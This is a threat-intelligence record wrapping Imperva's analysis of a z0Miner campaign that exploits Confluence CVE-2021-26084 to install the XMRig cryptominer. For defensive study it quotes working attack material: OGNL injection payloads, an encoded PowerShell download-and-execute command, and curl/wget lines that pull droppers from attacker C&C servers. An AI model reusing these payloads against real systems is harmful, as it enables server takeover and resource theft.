{
    "id": "1b05dab3-e4e1-46f7-ad0b-ffef5310fcf0",
    "created_at": "2023-01-12T15:00:42.040436Z",
    "updated_at": "2025-03-27T02:08:41.003109Z",
    "deleted_at": null,
    "sha1_hash": "ae0be78221c4cfcd691e0214087b02f1eae09256",
    "title": "2021-09-13 - Attackers exploit CVE-2021-26084 for XMRig crypto mining on affected Confluence servers",
    "authors": "",
    "file_creation_date": "2022-05-28T03:49:55Z",
    "file_modification_date": "2022-05-28T03:49:55Z",
    "file_size": 2858015,
    "plain_text": "# Attackers exploit CVE-2021-26084 for XMRig crypto mining on affected Confluence servers\n\n**[imperva.com/blog/attackers-exploit-cve-2021-26084-for-xmrig-crypto-mining-on-affected-confluence-servers/](https://www.imperva.com/blog/attackers-exploit-cve-2021-26084-for-xmrig-crypto-mining-on-affected-confluence-servers/)**\n\nSeptember 13, 2021\n\n## Vulnerability Overview\n\nOn August 25, 2021 [a security advisory was released for a vulnerability identified in Confluence Server](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html)\ntitled “CVE-2021-26084: Atlassian Confluence OGNL Injection”.\n\nThe vulnerability allows an unauthenticated attacker to perform remote command execution by taking\nadvantage of an insecure handling of OGNL (Object-Graph Navigation Language) on affected\nConfluence servers.\n\nSoon after the publication, various POC/Exploits were published online – at the time of writing this blog\nthere are 32 Github repositories available for CVE-2021-26084.\n\n\n-----\n\nBesides the publicly available exploits (attempts at executing them were already detected on our\nsystems), Imperva security researchers were able to identify attackers’ attempts to exploit this\nvulnerability in order to install and run the XMRig cryptocurrency miner on affected Confluence servers\nrunning on Windows and Linux systems.\n\n## Analysis\n\n### Attacker Methodology\n\nAs mentioned above we were able to detect payloads targeting Windows and Linux Confluence servers.\n\nIn both cases, the attacker is using the same methodology in exploiting a vulnerable Confluence Server.\n\nAttacker determines the target operating system and downloads Linux Shell/Windows Powershell\ndropper scripts from a remote C&C server, and writes them into a writable location on the affected\nsystem (under /tmp on Linux and $env:TMP system variable on Windows).\nExecuting downloaded dropper scripts.\n\n\n-----\n\nDropper Scripts perform the following actions to download, install and execute the XMRig crypto\nmining files:\n\nRemoval of competing crypto mining processes and their related files.\nEstablishing persistence by adding a crontab/scheduled task based on the operating system.\nDownload of the XMRig crypto mining files and post-exploitation clean up scripts. The files are\nwritten to temporary locations, masked as legitimate services/executables.\nStarting XMRig mining.\nExecution of post-exploitation scripts.\n\n### Downloaded Dropper Scripts\n\nThe following malicious payload was observed on our monitoring systems:\n\nqueryString=aaaaaaaa’+{Class.forName(‘javax.script.ScriptEngineManager’)\n.newInstance().getEngineByName(‘JavaScript’).eval(‘var isWin =\n\njava.lang.System.getProperty(“os.name”).toLowerCase().contains(“win”);\n\nvar cmd = new java.lang.String(“curl -fsSL\n\nhxxp://27.1.1.34:8080/docs/s/26084.txt -o /tmp/.solrg”);var p = new\n\njava.lang.ProcessBuilder(); if(isWin){p.command(“cmd.exe”, “/c”, cmd);\n\n} else{p.command(“bash”, “-c”, cmd); }p.redirectErrorStream(true); var\n\nprocess= p.start(); var inputStreamReader = new\n\njava.io.InputStreamReader(process.getInputStream());\n\nvar bufferedReader = new java.io.BufferedReader(inputStreamReader); var\n\nline = “”; var output = “”; while((line = bufferedReader.readLine())\n\n!= null){output = output + line + java.lang.Character.toString(10);\n\n}’)}+’\n\nFrom the sample above we see the attacker is attempting to determine the vulnerable server operating\nsystem by calling java.lang.System.getProperty(“os.name”):\n\nOnce the operating system is determined, a file is downloaded from a remote source by either using curl\nas can be seen in the example above or by powershell:\n\nDownload of a Linux Shell dropper script:\n\nvar cmd = new java.lang.String(“curl -fsSL hxxp://27.1.1.34:8080/docs/s/26084.txt -o /tmp/.solrg“);\n\nDownload of a Windows Powershell dropper script:\n\nvar cmd = new java.lang.String(“powershell -enc\n**SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC**\n\n**4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAo**\n**ACcAaAB0AHQAcAA6AC8ALwAyADcALgAxAC4AMQAuADMANAA6ADgAMAA4ADAALwBkAG8AYw**\n**BzAC8AcwAvAHMAeQBzAC4AcABzADEAJwApAA==”);**\n\nThe powershell payload is base64 encoded, thus decoded into the following code which downloads the\nsys.ps1 file:\n\n[IEX (New-Object System.Net.Webclient).DownloadString(‘hxxp://27.1.1.34:8080/docs/s/sys.ps1‘)](https://www.imperva.com/blog/attackers-exploit-cve-2021-26084-for-xmrig-crypto-mining-on-affected-confluence-servers/8080/docs/s/sys.ps1)\n\nShell Dropper scripts:\n\ncurl -fsSL [hxxp://27.1.1.34:8080/docs/s/26084.txt -o /tmp/.solrg](http://27.1.1.34:8080/docs/s/26084.txt)\n\nPost-exploitation linked clean up scripts that remove all traces of the dropper script mentioned above:\n\n\n-----\n\ncurl -fsSL [hxxp://27.1.1.34:8080/docs/s/kg.txt -o /tmp/.solrx](https://www.imperva.com/blog/attackers-exploit-cve-2021-26084-for-xmrig-crypto-mining-on-affected-confluence-servers/8080/docs/s/kg.txt)\ncurl -fsSL [hxxp://27.1.1.34:8080/docs/s/kk.txt -o /tmp/.solrx](https://www.imperva.com/blog/attackers-exploit-cve-2021-26084-for-xmrig-crypto-mining-on-affected-confluence-servers/8080/docs/s/kk.txt)\ncurl -fsSL [hxxp://27.1.1.34:8080/docs/s/kill.sh -o /tmp/.{random_string}](https://www.imperva.com/blog/attackers-exploit-cve-2021-26084-for-xmrig-crypto-mining-on-affected-confluence-servers/8080/docs/s/kk.txt)\n\n### Executing Downloaded Dropper Scripts\n\nThe downloaded dropper scripts are executed using the similar payload found in the vulnerable\nquerystring parameter shown above.\n\nBelow is one example where again the attacker is using different code execution command based on the\naffected server operating system detected:\n\nqueryString=aaaaaaaa’+{Class.forName(‘javax.script.ScriptEngineManager\n\n‘).newInstance().getEngineByName(‘JavaScript’).eval(‘var isWin =\n\njava.lang.System.getProperty(“os.name”).toLowerCase().contains(“win”);\n\n**var cmd = new java.lang.String(“bash /tmp/.solrg“);var p = new**\n\njava.lang.ProcessBuilder(); if(isWin){p.command(“cmd.exe”, “/c”, cmd);\n\n} else{p.command(“bash”, “-c”, cmd); }p.redirectErrorStream(true); var\n\nprocess= p.start(); var inputStreamReader = new\n\njava.io.InputStreamReader(process.getInputStream()); var\n\nbufferedReader = new java.io.BufferedReader(inputStreamReader); var\n\nline = “”; var output = “”; while((line = bufferedReader.readLine())\n\n!= null){output = output + line + java.lang.Character.toString(10);\n\n}’)}+’\n\n### Dropper Script Analysis\n\nAs mentioned earlier, the first part of the dropper scripts are performing the removal of competing crypto\nmining processes and their related files.\n\nOn Linux systems:\n\n\n-----\n\nOn Windows systems:\n\nIn the next step, the script establishes persistence by adding a crontab/scheduled task, and downloads\nadditional files from publicly available platforms that can sometimes host malwares (pastebin).\n\nOn Linux systems:\n\n\n-----\n\nOn Windows systems:\n\nThe script then finally downloads the XMRig cryptocurrency miner files.\n\nThe files are then written to temporary locations, masked as legitimate services/executables.\n\nAnd finally, the script starting the XMRig mining and execution of post-exploitation scripts is done\nseparately.\n\nThe set of actions described above is executed differently based on the target operating system.\n\nOn Linux systems:\n\nDownloaded XMRig cryptocurrency miner files:\n\ncurl -fsSL hxxp://27[.]1[.]1[.]34[:]8080/docs/s/config.json -o /tmp/.solr/config.json – Miner Config file\n\ncurl -fsSL hxxp://222[.]122[.]47[.]27[:]2143/auth/solrd.exe -o /tmp/.solr/solrd – XMRig Miner\n\ncurl -fsSL hxxp://27[.]1[.]1[.]34[:]8080/docs/s/solr.sh -o /tmp/.solr/solr.sh – XMRig Miner starter script\n\nThe script then executes the solr.sh miner starter script which in turn executes solrd, which is the XMRig\nMiner file that starts the mining process.\n\n\n-----\n\nOn Windows systems:\nFirst some variables are set, followed by a custom function (function Update($url,$path,$proc_name) that\nperforms file downloads using the WebClient.DownloadFile Method using a System.Net.WebClient\nobject,\nwhich is used later in the script:\n\nXMRig miner executable, miner name and path:\n\n$miner_url = “hxxp://222[.]122[.]47[.]27[:]2143/auth/xmrig.exe”\n\n$miner_name = “javae”\n\n$miner_path = “$env:TMP\\javae.exe”\n\nMiner configuration file, name and path:\n\n$miner_cfg_url = “hxxp://27[.]1[.]1[.]34[:]8080/docs/s/config.json”\n\n$miner cfg name = “config.json”\n\n\n-----\n\n$miner_cfg_path = $env:TMP\\config.json\n\nClean-up batch script (clean.bat), name and path:\n$killmodule_url = “hxxp://27[.]1[.]1[.]34[:]8080/examples/clean.bat”\n$killmodule_name = “clean.bat”\n$killmodule_path = “$env:TMP\\clean.bat”\n\nAfter the script variables are set, the script then performs the following actions:\n\nClears the System File, Hidden File and Read-Only attributes for any previously installed miner\nconfiguration files (config.json), and deletes their relevant files and folders.\nUsing the custom Update function, it downloads the miner executable and config files by passing the\nvariables set earlier to the said function.\nNext it sets the System File, Hidden File and Read-Only attributes for the newly downloaded miner files,\nand starts the miner process.\n\nLast step is executing the clean-up batch script, and termination of the powershell.exe process.\n\n### Attacker Origin\n\nThe threat actors’ TTP (tactics, techniques, procedures) aren’t new and we’ve seen similar attack\ncampaigns in the past. Based on the data we observed including downloaders, payloads, configuration,\nC&C servers and more, we identified a known threat actor that is tied to previous attack campaigns going\nback as far as March 2021.\n\nThe C&C 27[.]1[.]1[.]34[:]8080 has been previously associated with the z0Miner botnet.\n\nz0Miner is a malicious mining family that became active last year and has been publicly analyzed by the\n[Tencent Security Team.](https://s.tencent.com/research/report/1170.html)\n\nIt was found that the attackers exploited two Oracle Weblogic RCE vulnerabilities (CVE-2020-14882 and\nCVE-2020-14883), which used the same methodology as mentioned earlier to install XMRig crypto\nminers on affected systems.\n\nIn past cases it was found that the same botnet was exploiting an ElasticSearch RCE vulnerability (CVE2015-1427) and an older RCE impacting Jenkins servers using the same methodology\n\n\n-----\n\nOur findings lead us to believe that the same z0Miner botnet is actively exploiting CVE-2021-26084 for\nXMRig crypto mining.\n\n### Other Identified Payloads\n\nOther payloads were observed on our monitoring systems attempting to exploit CVE-2021-26084, and\nwere identified as:\n\nMuhstik IOT Botnet activity\n\ncurl -s 194[.]31[.]52[.]174/conf2||wget -qO –\n\n194[.]31[.]52[.]174/conf2\n\nThe following research was conducted about this identified bot activity:\n\n[Muhstik Takes Aim at Confluence CVE 2021-26084](https://www.lacework.com/blog/muhstik-takes-aim-at-confluence-cve-2021-26084/)\n\nVirusTotal identified the following payloads as:\n\nBillGates Botnet\n\ncurl -O hxxp://213[.]202[.]230[.]103/syna;wget\n\nhxxp://213[.]202[.]230[.]103/syna\n\nDofloo Trojan\n\ncurl -O hxxp://213[.]202[.]230[.]103/quu;wget\n\nhxxp://213[.]202[.]230[.]103/quu\n\n## Summary\n\nAs is often the case with RCE vulnerabilities, attackers will rush and exploit affected systems for their\nown gain. RCE vulnerabilities can easily allow threat actors to exploit affected systems for easy monetary\ngain by installing crypto currency miners and masking their activity, thus abusing the processing\nresources of the target.\n\nOnce CVE-2021-26084 publicly published, the Imperva Threat Research team immediately began their\nresearch on creating a mitigation. It was soon found out that protection against the vulnerability was\nalready provided Out-Of-The-Box.\n\n### Try Imperva for Free\n\nProtect your business for 30 days on Imperva.\n\n[Start Now](https://www.imperva.com/free-trial/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-13 - Attackers exploit CVE-2021-26084 for XMRig crypto mining on affected Confluence servers.pdf"
    ],
    "report_names": [
        "2021-09-13 - Attackers exploit CVE-2021-26084 for XMRig crypto mining on affected Confluence servers.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535642,
    "ts_updated_at": 1743041321,
    "ts_creation_date": 1653709795,
    "ts_modification_date": 1653709795,
    "files": {
        "pdf": "https://archive.orkl.eu/ae0be78221c4cfcd691e0214087b02f1eae09256.pdf",
        "text": "https://archive.orkl.eu/ae0be78221c4cfcd691e0214087b02f1eae09256.txt",
        "img": "https://archive.orkl.eu/ae0be78221c4cfcd691e0214087b02f1eae09256.jpg"
    }
}